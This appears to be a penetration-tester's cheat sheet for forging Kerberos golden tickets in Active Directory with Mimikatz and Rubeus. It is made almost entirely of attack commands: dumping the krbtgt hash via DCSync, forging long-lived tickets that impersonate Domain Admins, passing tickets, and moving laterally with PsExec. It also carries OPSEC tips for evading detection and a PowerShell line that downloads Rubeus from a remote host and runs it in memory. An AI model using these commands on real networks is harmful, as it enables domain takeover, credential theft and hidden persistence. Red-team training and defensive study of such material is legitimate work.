# Binaries

## 01 - Mimikatz

```
mimikatz # privilege::debug
Privilege '20' OK
```

> [!IMPORTANT]
> Note down the domain name, domain controller, and Object Security ID which is the SID (ignore the last digits before the dash like `-501` for example)

```
mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt
```

Finally to generate a golden ticket to authenticate as an admin in order to maintain persistence it is recommended for OPSEC reasons that instead of making a new username (like **sysadmin** or **Administrator**) which you can but it's better to impersonate one of the user accounts that is part of **`Domain Admins`**.

Run this command to check which users are part of the **Domain Admins** group to impersonate it (note it will last for 10 years).

```
C:\> net group "domain admins" /domain

mimikatz # kerberos::golden /domain:<domain> /sid:<sid> /krbtgt:<krbtgt_nt_hash> /id:500 /user:<domain_admin_user_account_to_impersonate> /ptt
```

> [!INFO]
> You can export the ticket to save for further use in the future.

```
mimikatz # kerberos::golden /domain:<domain> /sid:<sid> /krbtgt:<krbtgt_ntlm_hash> /id:500 /user:<domain_admin_user_account_to_impersonate> /ticket:golden_ticket.kirbi /ptt
```

List the golden ticket account to see if you're authenticated (your current session).

```
C:\> klist.exe

mimikatz # kerberos::list

mimikatz # kerberos::tgt
```

To export a golden ticket that is already authenticated in the active directory.

```
mimikatz # kerberos::list /export
```

Pass The Ticket.

```
mimikatz # kerberos::ptt golden_ticket.kirbi
```

> [!WARNING] OPSEC Consideration
> `/inject` is not OPSEC safe

Dump the hashes.

```
mimikatz # lsadump::lsa [/patch | /inject] /name:krbtgt

mimikatz # kerberos::golden /user:totallylegitadmin /domain:<domain> /sid:<sid> /krbtgt:<krbtgt_ntlm_hash> /ptt

mimikatz # kerberos::golden /user:totallylegitadmin /domain:<domain> /sid:<sid> /aes256:<aes256_hash> /groups:512,513,519 /startoffset:-1 /endin:2500 /renewmax:3000 /ptt

mimikatz # misc::cmd

C:\> PsExec64.exe -accepteula -nobanner \\<IP> cmd.exe
```

## 02 - Rubeus

Run it memory

```powershell
PS C:\> $data = (New-Object Net.WebClient).DownloadString('http://<IP>/Rubeus.exe')
$assembly = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
```

Generate a golden ticket

```powershell
PS C:\> [Rubeus.Program]::Main("s4u /user:<username> /rc4:<nt_hash> /impersonateuser:Administrator /msdsspn:<SPN>/<IP> /ptt".Split())

PS C:\> Rubeus.exe s4u /user:<username> /rc4:<nt_hash> /impersonateuser:Administrator /msdsspn:<SPN>/<IP> /ptt

PS C:\> klist

PS C:\> Rubeus.exe triage

PS C:\> Rubeus.exe klist

PS C:\> Get-ChildItem \\<IP>\C$
```

Pass the Ticket

```
PS C:\> Rubeus.exe ptt /ticket:golden_ticket.kirbi

PS C:\> Rubeus.exe ptt /ticket:<base64_encoded_golden_ticket>
```

---
## References

### Hackndo

- [Hackndo: Kerberos Sliver Golden Tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/)

### Pentestlab

- [Pentestlab Blog: Golden Ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)

### Hacking Articles

- [Hacking Articles: Metasploit For Pentester Mimikatz](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/)